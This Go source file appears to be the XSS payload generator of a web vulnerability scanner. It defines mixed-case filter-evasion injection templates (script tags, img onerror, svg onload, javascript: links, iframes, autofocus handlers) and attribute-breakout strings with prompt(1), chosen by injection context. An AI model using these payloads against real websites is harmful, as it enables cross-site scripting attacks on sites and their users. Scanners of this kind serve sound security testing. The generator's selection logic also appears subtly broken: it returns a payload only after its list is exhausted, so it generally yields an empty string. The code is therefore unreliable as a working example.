package Xss

import (
	"fmt"
	"math/rand"
	"net/url"
	"time"

	"github.com/thoas/go-funk"
)

type Xss struct {
	RawString string
	Url       *url.URL
	Query     *url.Values
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

var (
	htmlmode = 1
	comment  = 2
	attibute = 3
)

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

var (
	script_payload string = "<ScRiPt>%s</sCrIpT>"
	//JaVaScRiPt_payload string = "<ScRiPt>JaVaScRiPt:var %s</sCrIpT>"
	img_payload    string = "<iMg SrC=1 oNeRrOr=%s>"
	href_payload   string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
	svg_payload    string = "<sVg/OnLoAd=%s>"
	iframe_payload string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
	input_payload  string = "<input autofocus onfocus=%s>"
	// style_payload   string = "expression(a(%s))"
	// payload3_prompt string = "prompt(1)"
)

var (
	flag_tag1       string = "'><%s>//"
	flag_tag2       string = "\"><%s>//"
	flag_tag3       string = " ><%s>// "
	flag_Attibutes1 string = "'%s=prompt(1)'"
	flag_Attibutes2 string = "\"%s=prompt(1)\""
	flag_Attibutes3 string = " %s=prompt(1) "
)

type Generator struct {
	words []string
	i     int
	value string
}

func (g *Generator) Next() bool {
	if g.i == len(g.words) {
		return false
	}
	g.value = g.words[g.i]
	g.i++
	return true
}

func (g *Generator) Value() interface{} {
	return g.value
}

//GeneratorPayload 生成payload
func (g *Generator) GeneratorPayload(mode int, flag string, extension interface{}) string {
	if htmlmode == mode {
		htmlpayload := []string{script_payload, img_payload, href_payload, svg_payload, iframe_payload, input_payload}
		g.words = append(g.words, htmlpayload...)
		if !g.Next() {
			switch s := g.Value().(type) {
			case string:
				return fmt.Sprintf(s, flag)
			}
		}
	} else if comment == mode {
		commentpayload := []string{script_payload}
		g.words = append(g.words, commentpayload...)
		if !g.Next() {
			switch s := g.Value().(type) {
			case string:
				return fmt.Sprintf(s, flag)
			}
		}
	} else if attibute == mode {
		switch s := extension.(type) {
		case string:
			if funk.Contains(s, "key") {
				KeyPayload := []string{script_payload, img_payload, href_payload, svg_payload, iframe_payload, input_payload}
				g.words = append(g.words, KeyPayload...)
				if !g.Next() {
					switch v := g.Value().(type) {
					case string:
						return fmt.Sprintf(v, flag)
					}
				}
			} else if funk.Contains(s, "value") {
				ValuePayload := []string{flag_tag1, flag_tag2, flag_tag3, flag_Attibutes1, flag_Attibutes2, flag_Attibutes3}
				g.words = append(g.words, ValuePayload...)
				if !g.Next() {
					switch v := g.Value().(type) {
					case string:
						return fmt.Sprintf(v, flag)
					}
				}
			}
		}

	}
	return ""
}
